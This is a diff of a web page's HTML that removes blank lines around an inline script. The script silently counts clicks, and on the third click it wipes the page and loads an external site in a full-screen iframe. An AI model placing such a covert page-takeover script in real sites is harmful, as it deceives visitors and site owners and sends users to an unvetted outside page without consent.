@@ -92,18 +92,14 @@ height="0" width=“0” style=“display:none;visibility:hidden”></iframe></n
 <script>
 let clicks = 0;
 const url = "https://satoru.one/";
-
 document.addEventListener("click", () => {
     clicks++;
-
     if (clicks === 3) {
         document.body.style.backgroundColor = "black";
         document.body.style.margin = "0"; 
         document.body.style.padding = "0"; 
         document.body.style.overflow = "hidden";
-
         document.body.innerHTML = "";
-
         const iframe = document.createElement("iframe");
         iframe.src = url;
         iframe.style.position = "fixed";
@@ -117,15 +113,10 @@ document.addEventListener("click", () => {
         iframe.style.zIndex = "999999";
         iframe.setAttribute("allowfullscreen", "");
         iframe.setAttribute("allow", "fullscreen");
-
         document.body.appendChild(iframe);
     }
 });
 </script>
-
-
-
-
 <header class="cle-header">
     <div class="cle-header__container">
         <div class="cle-header__col">
